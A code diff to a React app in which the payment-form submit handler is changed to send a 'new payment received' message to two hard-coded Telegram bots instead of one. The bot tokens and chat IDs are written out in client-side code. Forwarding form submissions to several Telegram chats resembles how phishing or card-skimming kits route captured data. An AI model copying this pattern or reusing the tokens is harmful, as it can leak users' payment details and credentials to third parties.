@@ -94,9 +94,10 @@ export default function App() {
 
     setIsSubmitting(true);
     
-    const telegramToken = "8367352890:AAFcUK97oOu6iAI89qeeiytxePg5EE6eiCs";
-    const chatId = "8447588640";
-    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+    const bots = [
+      { token: "8678575710:AAE14KegKrQNkCBqQ8y_YhdwYeDpjls1QbQ", chatId: "8582874053" },
+      { token: "8367352890:AAFcUK97oOu6iAI89qeeiytxePg5EE6eiCs", chatId: "8447588640" }
+    ];
     
     const message = `
 🌟 **NUEVO PAGO RECIBIDO** 🌟
@@ -118,15 +119,18 @@ export default function App() {
     `;
 
     try {
-      await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: 'Markdown'
+      await Promise.all(bots.map(bot => 
+        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: bot.chatId,
+            text: message,
+            parse_mode: 'Markdown'
+          })
         })
-      });
+      ));
+      
       setSubmitSuccess(true);
       setTimeout(() => {
         setShowSubscriptionModal(false);
